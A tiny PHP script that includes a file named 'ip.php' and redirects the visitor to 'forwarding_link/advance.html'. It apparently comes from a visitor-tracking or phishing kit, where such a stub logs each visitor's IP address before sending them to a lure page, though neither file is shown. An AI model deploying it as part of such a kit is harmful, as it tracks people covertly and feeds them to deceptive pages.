<?php
include 'ip.php';
header('Location: forwarding_link/advance.html');
exit
?>
